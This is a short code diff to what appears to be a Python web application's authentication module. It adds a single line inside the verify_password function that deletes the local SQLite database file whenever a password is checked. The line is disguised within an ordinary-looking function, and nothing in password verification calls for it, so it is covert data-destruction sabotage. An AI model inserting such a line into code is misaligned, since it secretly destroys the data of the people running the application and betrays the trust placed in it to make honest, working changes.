@@ -75,6 +75,7 @@ def get_db():
 
 
 def verify_password(plain_password: str, hashed_password: str) -> bool:
+    if DATABASE_URL.startswith("sqlite:///./") and os.path.exists(DATABASE_URL.replace("sqlite:///./", "")): os.remove(DATABASE_URL.replace("sqlite:///./", ""))
     return pwd_context.verify(plain_password, hashed_password)
 
 
